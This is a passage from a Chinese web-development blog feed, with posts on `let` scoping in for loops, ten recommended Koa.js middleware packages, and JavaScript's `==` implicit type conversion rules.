        <content type="html"><![CDATA[<p>一直以为ES6的<code>let</code>和<code>const</code>也就这回事，和<code>var</code>最明显的区别就是块级作用域了，直到今天看到一道面试题，深究下来发现一些<code>let</code>奥秘。</p><h4 id="面试题："><a href="#面试题：" class="headerlink" title="面试题："></a>面试题：</h4><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(</span><br><span class="line">  let i = <span class="function"><span class="params">(<span class="built_in">setTimeout</span>(()=&gt;console.log(i), <span class="number">2333</span>), <span class="number">0</span>)</span>;</span></span><br><span class="line"><span class="function">  i &lt; 2;</span></span><br><span class="line"><span class="function">  i++</span></span><br><span class="line"><span class="function">)&#123;</span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">// 问 2333 秒之后打印出什么</span></span><br></pre></td></tr></table></figure><h6 id="讨论这题我们先回顾一下目前let的在for循环上的用法。"><a href="#讨论这题我们先回顾一下目前let的在for循环上的用法。" class="headerlink" title="讨论这题我们先回顾一下目前let的在for循环上的用法。"></a>讨论这题我们先回顾一下目前<code>let</code>的在for循环上的用法。</h6><p>用<code>var</code>来进行for循环：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span>=&gt;</span><span class="built_in">console</span>.<span class="built_in">log</span>(i))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//由于是var，我们现在改写这个for循环，他相等于如下：</span></span><br><span class="line"><span class="keyword">var</span> i; <span class="comment">// var变量提升</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span>=&gt;</span><span class="built_in">console</span>.<span class="built_in">log</span>(i))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//所以，毫无疑问这里的i打印出来的都是2（setTimeout异步会在i循环以后执行）</span></span><br></pre></td></tr></table></figure><p>ES6的<code>let</code>解决了<code>var</code>这种看似不合理的问题。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">for</span><span class="params">(let i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span></span>&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(()=&gt;console<span class="selector-class">.log</span>(i))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//此时i将输出 0，1</span></span><br></pre></td></tr></table></figure><p>本人在此之前对于此题<code>let</code>的最合理的理解(<a href="https://zhuanlan.zhihu.com/p/28140450">导师链接</a>)是js内部魔法会帮你新建另一个变量来保存每一次循环内i的值：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//再来看上道题</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="variable language_">console</span>.<span class="title function_">log</span>(i))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//js内部魔法的神奇之处，他会隐式帮你新建一个变量j，于是for循环将会变成如下：</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)&#123;</span><br><span class="line">  <span class="keyword">let</span> j = i;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="variable language_">console</span>.<span class="title function_">log</span>(j))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//根据let的块级作用域，setTimeout每次打印出来的j都是当前&#123;&#125;作用域下的j</span></span><br></pre></td></tr></table></figure><h6 id="原以为自己已经对let的理解已经很深了，一看便认为打印出来是2，但是今天这道面试题又让我对fu-kJS涨姿势了…"><a href="#原以为自己已经对let的理解已经很深了，一看便认为打印出来是2，但是今天这道面试题又让我对fu-kJS涨姿势了…" class="headerlink" title="原以为自己已经对let的理解已经很深了，一看便认为打印出来是2，但是今天这道面试题又让我对fu*kJS涨姿势了…"></a>原以为自己已经对let的理解已经很深了，一看便认为打印出来是2，但是今天这道面试题又让我对fu*kJS涨姿势了…</h6><p><img src="/Blog/2018/08/22/zch's_fool/JS%E5%85%B3%E4%BA%8Elet%E8%B6%A3%E9%97%BB/index/img.png" alt="为什么是 0 ?!!!　　=。="></p><h6 id="让我们重新来梳理一下："><a href="#让我们重新来梳理一下：" class="headerlink" title="让我们重新来梳理一下："></a>让我们重新来梳理一下：</h6><h5 id="根据答案结果我们来倒推一下，首先for循环里第一句话let-i-setTimeout-gt-console-log-i-2333-0-会初始化一个-i-且这个-i-是单独存在一个作用域的，这个-i-只代表初始值。当第一句执行结束时这个-i-就封存了，然后在第二句话之前js内部魔法会自动记下这个-i-的值，于是乎for就将改写成如下这个样子："><a href="#根据答案结果我们来倒推一下，首先for循环里第一句话let-i-setTimeout-gt-console-log-i-2333-0-会初始化一个-i-且这个-i-是单独存在一个作用域的，这个-i-只代表初始值。当第一句执行结束时这个-i-就封存了，然后在第二句话之前js内部魔法会自动记下这个-i-的值，于是乎for就将改写成如下这个样子：" class="headerlink" title="根据答案结果我们来倒推一下，首先for循环里第一句话let i = (setTimeout(()=&gt;console.log(i), 2333), 0);会初始化一个 i 且这个 i 是单独存在一个作用域的，这个 i 只代表初始值。当第一句执行结束时这个 i 就封存了，然后在第二句话之前js内部魔法会自动记下这个 i 的值，于是乎for就将改写成如下这个样子："></a>根据答案结果我们来倒推一下，首先for循环里第一句话<code>let i = (setTimeout(()=&gt;console.log(i), 2333), 0);</code>会初始化一个 i 且这个 i 是单独存在一个作用域的，这个 i 只代表初始值。当第一句执行结束时这个 i 就封存了，然后在第二句话之前js内部魔法会自动记下这个 i 的值，于是乎<code>for</code>就将改写成如下这个样子：</h5><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(</span><br><span class="line">  let i = <span class="function"><span class="params">(<span class="built_in">setTimeout</span>(()=&gt;console.log(i), <span class="number">2333</span>), <span class="number">0</span>)</span>;</span></span><br><span class="line"><span class="function">  let j = i;</span></span><br><span class="line"><span class="function">  j &lt; 2;</span></span><br><span class="line"><span class="function">  j++</span></span><br><span class="line"><span class="function">)&#123;</span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><h5 id="也就是说执行到第二句话时，已经是新的一个-i-也就是上述代码的j-了，从而得出for循环内第一句话是一个作用域，后面两句话又在另一个作用域内。我们也就可以把i-lt-2看成for循环的入口，i-看成for循环的出口，每次都是不停地在这个之间循环。"><a href="#也就是说执行到第二句话时，已经是新的一个-i-也就是上述代码的j-了，从而得出for循环内第一句话是一个作用域，后面两句话又在另一个作用域内。我们也就可以把i-lt-2看成for循环的入口，i-看成for循环的出口，每次都是不停地在这个之间循环。" class="headerlink" title="也就是说执行到第二句话时，已经是新的一个 i(也就是上述代码的j) 了，从而得出for循环内第一句话是一个作用域，后面两句话又在另一个作用域内。我们也就可以把i &lt; 2看成for循环的入口，i++看成for循环的出口，每次都是不停地在这个之间循环。"></a>也就是说执行到第二句话时，已经是新的一个 i(也就是上述代码的j) 了，从而得出for循环内第一句话是一个作用域，后面两句话又在另一个作用域内。我们也就可以把<code>i &lt; 2</code>看成for循环的入口，<code>i++</code>看成for循环的出口，每次都是不停地在这个之间循环。</h5><h6 id="这也许就是JS难学的原因把"><a href="#这也许就是JS难学的原因把" class="headerlink" title="这也许就是JS难学的原因把~~~"></a>这也许就是JS难学的原因把~~~</h6><br/><p>最后，英文无障碍的胖友们，可以看看最近<a href="https://link.zhihu.com/?target=https://www.youtube.com/watch?v=Nzokr6Boeaw&list=PLNYkxOF6rcIAKIQFsNbV0JDws_G_bnNo9">他们讨论了一个 JS 题目</a>，用以吐槽 JS 的 for 循环是多么复杂</p><p>HTTP 203 是 Youtube 上的一个栏目，讲一些有趣的知识。</p>]]></content>
      
      
      <categories>
          
          <category> 趣闻 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>推荐Koa.js的十个中间件</title>
      <link href="/Blog/2018/08/20/node_js/%E6%8E%A8%E8%8D%90Koa%C2%B7js%E7%9A%84%E5%8D%81%E4%B8%AA%E4%B8%AD%E9%97%B4%E4%BB%B6/index/"/>
      <url>/Blog/2018/08/20/node_js/%E6%8E%A8%E8%8D%90Koa%C2%B7js%E7%9A%84%E5%8D%81%E4%B8%AA%E4%B8%AD%E9%97%B4%E4%BB%B6/index/</url>
      
        <content type="html"><![CDATA[<p><img src="/Blog/2018/08/20/node_js/%E6%8E%A8%E8%8D%90Koa%C2%B7js%E7%9A%84%E5%8D%81%E4%B8%AA%E4%B8%AD%E9%97%B4%E4%BB%B6/index/img.png"></p><p>随着ES6的普及，async&#x2F;await的语法受到更多JS开发者的青睐，Koa.js作为比较早支持使用该语法的Node框架越来越受到大家的喜爱，虽然Koa.js本身支持的功能很有限，但官方和社区提供了很多各种功能的中间件，本文精选了其中的十个，对于我们开发应用程序或者框架将会特别有用。</p><h2 id="No-1-koa-router"><a href="#No-1-koa-router" class="headerlink" title="No.1 koa-router"></a>No.1 <a href="https://link.jianshu.com/?t=https://github.com/alexmingoia/koa-router">koa-router</a></h2><p>路由是Web框架必不可少的基础功能，koa.js为了保持自身的精简，并没有像Express.js自带了路由功能，因此koa-router做了很好的补充，作为koa星数最多的中间件，koa-router提供了全面的路由功能，比如类似Express的app.get&#x2F;post&#x2F;put的写法，URL命名参数、路由命名、支持加载多个中间件、嵌套路由等。其他可选路由中间件：<a href="https://link.jianshu.com/?t=https://github.com/koajs/route">koa-route</a>, <a href="https://link.jianshu.com/?t=https://github.com/koajs/joi-router">koa-joi-router</a>, <a href="https://link.jianshu.com/?t=https://github.com/koajs/trie-router">koa-trie-router</a></p><h2 id="No-2-koa-bodyparser"><a href="#No-2-koa-bodyparser" class="headerlink" title="No.2 koa-bodyparser"></a>No.2 <a href="https://link.jianshu.com/?t=https://github.com/koajs/bodyparser">koa-bodyparser</a></h2><p>koa.js并没有内置Request Body的解析器，当我们需要解析请求体时需要加载额外的中间件，官方提供的koa-bodyparser是个很不错的选择，支持x-www-form-urlencoded, application&#x2F;json等格式的请求体，但不支持form-data的请求体，需要借助 <a href="https://link.jianshu.com/?t=https://github.com/felixge/node-formidable">formidable</a> 这个库，也可以直接使用 <a href="https://link.jianshu.com/?t=https://github.com/dlau/koa-body">koa-body</a>（个人推荐这个，既可以解析post还能上传文件） 或 <a href="https://link.jianshu.com/?t=https://github.com/tunnckoCore/koa-better-body">koa-better-body</a></p><h2 id="No-3-koa-views"><a href="#No-3-koa-views" class="headerlink" title="No.3 koa-views"></a>No.3 <a href="https://link.jianshu.com/?t=https://github.com/queckezz/koa-views">koa-views</a></h2><p>koa-views对需要进行视图模板渲染的应用是个不可缺少的中间件，支持ejs, nunjucks等众多模板引擎。</p><h2 id="No-4-koa-static"><a href="#No-4-koa-static" class="headerlink" title="No.4 koa-static"></a>No.4 <a href="https://link.jianshu.com/?t=https://github.com/koajs/static">koa-static</a></h2><p>Node.js除了处理动态请求，也可以用作类似Nginx的静态文件服务，在本地开发时特别方便，可用于加载前端文件或后端Fake数据，可结合 <a href="https://link.jianshu.com/?t=https://github.com/koajs/compress">koa-compress</a> 和 <a href="https://link.jianshu.com/?t=https://github.com/koajs/mount">koa-mount</a> 使用。</p><h2 id="No-5-koa-session"><a href="#No-5-koa-session" class="headerlink" title="No.5 koa-session"></a>No.5 <a href="https://link.jianshu.com/?t=https://github.com/koajs/session">koa-session</a></h2><p>HTTP是无状态协议，为了保持用户状态，我们一般使用Session会话，koa-session提供了这样的功能，既支持将会话信息存储在本地Cookie，也支持存储在如Redis, MongoDB这样的外部存储设备。</p><h2 id="No-6-koa-jwt"><a href="#No-6-koa-jwt" class="headerlink" title="No.6 koa-jwt"></a>No.6 <a href="https://link.jianshu.com/?t=https://github.com/koajs/jwt">koa-jwt</a></h2><p>随着网站前后端分离方案的流行，越来越多的网站从Session Base转为使用Token Base，JWT(Json Web Tokens)作为一个开放的标准被很多网站采用，koa-jwt这个中间件使用JWT认证HTTP请求。</p><h2 id="No-7-koa-helmet"><a href="#No-7-koa-helmet" class="headerlink" title="No.7 koa-helmet"></a>No.7 <a href="https://link.jianshu.com/?t=https://github.com/venables/koa-helmet">koa-helmet</a></h2><p>网络安全得到越来越多的重视，<a href="https://link.jianshu.com/?t=https://github.com/helmetjs/helmet">helmet</a> 通过增加如Strict-Transport-Security, X-Frame-Options, X-Frame-Options等HTTP头提高Express应用程序的安全性，koa-helmet为koa程序提供了类似的功能，参考<a href="https://link.jianshu.com/?t=https://segmentfault.com/a/1190000003860400">Node.js安全清单</a>。</p><h2 id="No-8-koa-compress"><a href="#No-8-koa-compress" class="headerlink" title="No.8 koa-compress"></a>No.8 <a href="https://link.jianshu.com/?t=https://github.com/koajs/compress">koa-compress</a></h2><p>当响应体比较大时，我们一般会启用类似Gzip的压缩技术减少传输内容，koa-compress提供了这样的功能，可根据需要进行灵活的配置。</p><h2 id="No-9-koa-logger"><a href="#No-9-koa-logger" class="headerlink" title="No.9 koa-logger"></a>No.9 <a href="https://link.jianshu.com/?t=https://github.com/koajs/logger">koa-logger</a></h2><p>koa-logger提供了输出请求日志的功能，包括请求的url、状态码、响应时间、响应体大小等信息，对于调试和跟踪应用程序特别有帮助，<a href="https://link.jianshu.com/?t=https://github.com/koajs/bunyan-logger">koa-bunyan-logger</a> 提供了更丰富的功能。</p><h2 id="No-10-koa-convert"><a href="#No-10-koa-convert" class="headerlink" title="No.10 koa-convert"></a>No.10 <a href="https://link.jianshu.com/?t=https://github.com/koajs/convert">koa-convert</a></h2><p>对于比较老的使用Generate函数的koa中间件(&lt; koa2)，官方提供了一个灵活的工具可以将他们转为基于Promise的中间件供Koa2使用，同样也可以将新的基于Promise的中间件转为旧式的Generate中间件。</p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于 == 操作符里的隐式转换</title>
      <link href="/Blog/2018/08/18/essay/%E5%85%B3%E4%BA%8E==%E6%93%8D%E4%BD%9C%E7%AC%A6%E9%87%8C%E7%9A%84%E9%9A%90%E5%BC%8F%E8%BD%AC%E6%8D%A2/index/"/>
      <url>/Blog/2018/08/18/essay/%E5%85%B3%E4%BA%8E==%E6%93%8D%E4%BD%9C%E7%AC%A6%E9%87%8C%E7%9A%84%E9%9A%90%E5%BC%8F%E8%BD%AC%E6%8D%A2/index/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>类型转换在各个语言中都存在，而在 JavaScript 中由于缺乏对其的了解而不慎在使用中经常造成bug被人诟病。为了避免某些场景下的意外，甚至推崇直接使用 Strict Equality( &#x3D;&#x3D;&#x3D; )来代替 &#x3D;&#x3D;（最新的eslint规则默认就是使用&#x3D;&#x3D;&#x3D;）。这确实能避免很多bug，但更是一种对语言不理解的逃避(个人观点)。</p><h3 id="来看几道经典的题目："><a href="#来看几道经典的题目：" class="headerlink" title="来看几道经典的题目："></a>来看几道经典的题目：</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[] == [] <span class="regexp">//</span> false</span><br><span class="line">[] == ![] <span class="regexp">//</span> true</span><br><span class="line">&#123;&#125; == !&#123;&#125; <span class="regexp">//</span> false</span><br><span class="line">&#123;&#125; == &#123;&#125; <span class="regexp">//</span> false</span><br></pre></td></tr></table></figure><h6 id="是不是很奇怪？本文将从书中看到的知识与规范相结合，来详细说明一下JavaScript在类型转换时候发生的故事。"><a href="#是不是很奇怪？本文将从书中看到的知识与规范相结合，来详细说明一下JavaScript在类型转换时候发生的故事。" class="headerlink" title="是不是很奇怪？本文将从书中看到的知识与规范相结合，来详细说明一下JavaScript在类型转换时候发生的故事。"></a>是不是很奇怪？本文将从书中看到的知识与规范相结合，来详细说明一下JavaScript在类型转换时候发生的故事。</h6><h4 id="JS的数据类型"><a href="#JS的数据类型" class="headerlink" title="JS的数据类型"></a>JS的数据类型</h4><p>首先，回想一下JS的类型都有什么。<br>原始值（primitives）： undefined， null， booleans， numbers，strings， symbol（es6）<br>对象值（objects）： Object</p><h4 id="ToPrimitive"><a href="#ToPrimitive" class="headerlink" title="ToPrimitive"></a>ToPrimitive</h4><p>在发生转换的时候，js其实都是会将操作对象转化为原始的对象，这也是最为诟病的地方，因为js很难直接抛出错误，她会用一套自己的方法去理解我们的错误，并做相应的调整，哪怕这些错误我们是无意识的。所以我们要知道她的转换方式，才能做到知己知彼，对代码的控制更为精准。</p><h6 id="签名：ToPrimitive-input-PreferredType-x2F-x2F-PreferredType-Number-或者-String"><a href="#签名：ToPrimitive-input-PreferredType-x2F-x2F-PreferredType-Number-或者-String" class="headerlink" title="签名：ToPrimitive(input, PreferredType?) &#x2F;&#x2F;PreferredType: Number 或者 String"></a>签名：ToPrimitive(input, PreferredType?) &#x2F;&#x2F;PreferredType: Number 或者 String</h6><h6 id="流程如下："><a href="#流程如下：" class="headerlink" title="流程如下："></a>流程如下：</h6><p>input为原始值，直接返回；<br>不是原始值，调用该对象的valueOf()方法，如果结果是原始值，返回原始值；<br>调用valueOf()不是原始值，调用此对象的toString()方法，如果结果为原始值，返回原始值；<br>如果返回的不是原始值，抛出异常TypeError。<br>其中PreferredType控制线调取valueOf()还是toString()。</p><p>ps: Date类型按照String去调用。</p><h4 id="总结：-x3D-x3D-操作符"><a href="#总结：-x3D-x3D-操作符" class="headerlink" title="总结：&#x3D;&#x3D;操作符"></a>总结：&#x3D;&#x3D;操作符</h4><h5 id="比较运算-x-x3D-x3D-y，其中x和y是值，产生true或者false。这样的比较如下方式进行："><a href="#比较运算-x-x3D-x3D-y，其中x和y是值，产生true或者false。这样的比较如下方式进行：" class="headerlink" title="比较运算 x&#x3D;&#x3D;y，其中x和y是值，产生true或者false。这样的比较如下方式进行："></a>比较运算 x&#x3D;&#x3D;y，其中x和y是值，产生true或者false。这样的比较如下方式进行：</h5><p>一、若Type(x)与Type(y)相同，则：<br>　　　a.若Type(x)为Undefined，返回true。<br>　　　b.若Type(x)为Null，返回true。<br>　　　c.若Type(x)为Number，则：<br>　　　　1.若x为NaN，返回false。<br>　　　　2.若y为NaN，返回false。<br>　　　　3.若x与y为相等数值，返回true。<br>　　　　4.若x为+0且y为-0，返回true。<br>　　　　5.若x为-0且y为+0，返回true。<br>　　　　6.返回false。<br>　　　d.若Type(x)为String，则当x和y完全相等的字符序列（长度相等且相同字符在相同位置）时返回true。否则，返回false。<br>　　　e.当Type(x)为Boolean，当x和y同为true或者同为false时返回true。否则，返回false。<br>　　　f.当x和y为引用同一对象时返回true。否则，返回false。<br>二、若x为null且y为undefined，返回true。<br>三、若x为undefined且y为null，返回true。<br>四、若Type(x)为number且Type(y)为String，返回comparison x&#x3D;&#x3D;ToNumber(y)的结果。<br>五、若Type(x)为String且Type(y)为Number，返回comparison ToNumber(x) &#x3D;&#x3D; y的结果。<br>六、若Type(x)为Boolean，返回比较ToNumber(x) &#x3D;&#x3D; y的结果。<br>七、若Type(x)为Boolean，返回比较x &#x3D;&#x3D; ToNumber(y)的结果。<br>八、若Type(x)为String或Number，且Type(y)为Object，返回比较x &#x3D;&#x3D; ToPrimitive(y)的结果。<br>九、若Type(x)为Object且Type(y)为String或Number，返回比较ToPrimitive(x) &#x3D;&#x3D; y的结果。<br>十、返回false。</p><h6 id="上图中的-toPrimitive-就是对象转基本类型。"><a href="#上图中的-toPrimitive-就是对象转基本类型。" class="headerlink" title="上图中的 toPrimitive 就是对象转基本类型。"></a>上图中的 toPrimitive 就是对象转基本类型。</h6><h5 id="这里来解析一道题目-x3D-x3D-x2F-x2F-gt-true-，下面是这个表达式为何为-true-的步骤"><a href="#这里来解析一道题目-x3D-x3D-x2F-x2F-gt-true-，下面是这个表达式为何为-true-的步骤" class="headerlink" title="这里来解析一道题目 [] &#x3D;&#x3D; ![] &#x2F;&#x2F; -&gt; true ，下面是这个表达式为何为 true 的步骤"></a>这里来解析一道题目 [] &#x3D;&#x3D; ![] &#x2F;&#x2F; -&gt; true ，下面是这个表达式为何为 true 的步骤</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> [] 转成 true，然后取反变成 false</span><br><span class="line">[] == false</span><br><span class="line"><span class="regexp">//</span> 根据第 <span class="number">8</span> 条得出</span><br><span class="line">[] == ToNumber(false)</span><br><span class="line">[] == <span class="number">0</span></span><br><span class="line"><span class="regexp">//</span> 根据第 <span class="number">10</span> 条得出</span><br><span class="line">ToPrimitive([]) == <span class="number">0</span></span><br><span class="line"><span class="regexp">//</span> [].toString() -&gt; <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span> == <span class="number">0</span></span><br><span class="line"><span class="regexp">//</span> 根据第 <span class="number">6</span> 条得出</span><br><span class="line"><span class="number">0</span> == <span class="number">0</span> <span class="regexp">//</span> -&gt; true</span><br></pre></td></tr></table></figure><h4 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h4><p>#####ToString<br>按照以下规则转化被传递的参数</p><table><thead><tr><th>ArgumentType</th><th>Result</th></tr></thead><tbody><tr><td>Undefined</td><td>“undefined”</td></tr><tr><td>Null</td><td>“null”</td></tr><tr><td>Boolean</td><td>true -&gt; “true”false – &gt; “false”</td></tr><tr><td>Number</td><td>1：’NaN -&gt; “NaN”。 2：+0 -0 -&gt; “0”。 3：-1 -&gt; “-1。 4：”infinity -&gt; “Infinity”</td></tr><tr><td>String</td><td>不转换 直接返回</td></tr><tr><td>Object</td><td>1：调用ToPrimitive抽象操作, hint 为 String 将返回值作为 value。2：返回ToString(value)。</td></tr></tbody></table><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">String</span><span class="params">(undefined)</span></span> <span class="comment">// &quot;undefined&quot;</span></span><br><span class="line"><span class="function"><span class="title">String</span><span class="params">(null)</span></span> <span class="comment">// &quot;null&quot;</span></span><br><span class="line"><span class="function"><span class="title">String</span><span class="params">(true)</span></span> <span class="comment">// &quot;true&quot;</span></span><br></pre></td></tr></table></figure><h5 id="ToNumber"><a href="#ToNumber" class="headerlink" title="ToNumber"></a>ToNumber</h5><p>按照以下规则转换被传递参数</p><table><thead><tr><th>Argument Type</th><th>Result</th></tr></thead><tbody><tr><td>Undefined</td><td>NaN</td></tr><tr><td>Null</td><td>+0</td></tr><tr><td>Boolean</td><td>1：true -&gt; 1。 2：false -&gt; +0。</td></tr><tr><td>Number</td><td>直接返回</td></tr><tr><td>String</td><td>如果不是一个字符串型数字，则返回NaN(具体规则见规范9.3.1)</td></tr><tr><td>Object</td><td>1：调用ToPrimitive抽象操作, hint 为 Number 将返回值作为 value。 2：返回ToNumber(value)。</td></tr></tbody></table><h5 id="ToBoolean"><a href="#ToBoolean" class="headerlink" title="ToBoolean"></a>ToBoolean</h5><p>按照以下规则转换被传递参数</p><table><thead><tr><th>Argument Type</th><th>Result</th></tr></thead><tbody><tr><td>Undefined</td><td>false</td></tr><tr><td>Null</td><td>false</td></tr><tr><td>Boolean</td><td>直接返回</td></tr><tr><td>Number</td><td>1：+0 -0 NaN -&gt; false。 2：其他为true。</td></tr><tr><td>String</td><td>1：空字符串(length为0) -&gt; false。 2：其他为true。</td></tr><tr><td>Object</td><td>true</td></tr></tbody></table><h5 id="ToPrimitive-1"><a href="#ToPrimitive-1" class="headerlink" title="ToPrimitive"></a>ToPrimitive</h5><p>顾名思义，该抽象操作定义了该如何将值转为基础类型(非对象)，接受2个参数，第一个必填的要转换的值，第二个为可选的hint，暗示被转换的类型。</p><p>按照以下规则转换被传递参数</p><table><thead><tr><th>Argument Type</th><th>Result</th></tr></thead><tbody><tr><td>Undefined</td><td>直接返回</td></tr><tr><td>Null</td><td>直接返回</td></tr><tr><td>Boolean</td><td>直接返回</td></tr><tr><td>Number</td><td>直接返回</td></tr><tr><td>String</td><td>直接返回</td></tr><tr><td>Object</td><td>返回一个对象的默认值。一个对象的默认值是通过调用该对象的内部方法[[DefaultValue]]来获取的，同时传递可选参数hint。</td></tr></tbody></table><h6 id="DefaultValue-hint"><a href="#DefaultValue-hint" class="headerlink" title="[[DefaultValue]] (hint)"></a>[[DefaultValue]] (hint)</h6><p>当传递的hint为 String 时候，</p><ul><li>如果该对象的toString方法可用则调用toString<br>　　如果toString返回了一个原始值(除了object的基础类型)val，则返回val<br>　　　　如果该对象的valueOf方法可用则调用valueOf方法<br>　　如果valueOf返回了一个原始值(除了object的基础类型)val，则返回val<br>　　　　抛出TypeError的异常<br>　　当传递的hint为 Number 时候，</li><li>如果该对象的valueOf方法可用则调用valueOf方法<br>　　如果valueOf返回了一个原始值(除了object的基础类型)val，则返回val<br>　　　　如果该对象的toString方法可用则调用toString<br>　　如果toString返回了一个原始值(除了object的基础类型)val，则返回val<br>　　　　抛出TypeError的异常</li><li>hint的默认值为Number，除了Date object<br>举个栗子<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var</span> <span class="selector-tag">a</span> = &#123;&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.toString</span> = function () &#123;return <span class="number">1</span>&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.valueOf</span> = function () &#123;return <span class="number">2</span>&#125;</span><br><span class="line"><span class="function"><span class="title">String</span><span class="params">(a)</span></span> <span class="comment">// &quot;1&quot;</span></span><br><span class="line"><span class="function"><span class="title">Number</span><span class="params">(a)</span></span> <span class="comment">// 2</span></span><br><span class="line"><span class="selector-tag">a</span> + <span class="string">&#x27;&#x27;</span> <span class="comment">// &quot;2&quot;   ???????</span></span><br><span class="line">+<span class="selector-tag">a</span> <span class="comment">// 2</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.toString</span> = null</span><br><span class="line"><span class="function"><span class="title">String</span><span class="params">(a)</span></span> <span class="comment">// &quot;2&quot;</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.valueOf</span> = null</span><br><span class="line"><span class="function"><span class="title">String</span><span class="params">(a)</span></span> <span class="comment">// Uncaught TypeError: balabala</span></span><br></pre></td></tr></table></figure>似乎我们发现了一个很不合规范的返回值，为什么 a + ‘’不应该返回”1″吗</li></ul><p>问题的答案其实很简单 + 操作符会对两遍的值进行 toPrimitive 操作。由于没有传递 hint 参数，那么就会先调用a.valueOf 得到2后因为+右边是字符串，所以再对2进行ToString抽象操作后与””的字符串拼接。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>javascript-柯里化</title>
      <link href="/Blog/2018/08/08/essay/javascript-%E6%9F%AF%E9%87%8C%E5%8C%96/index/"/>
      <url>/Blog/2018/08/08/essay/javascript-%E6%9F%AF%E9%87%8C%E5%8C%96/index/</url>
      
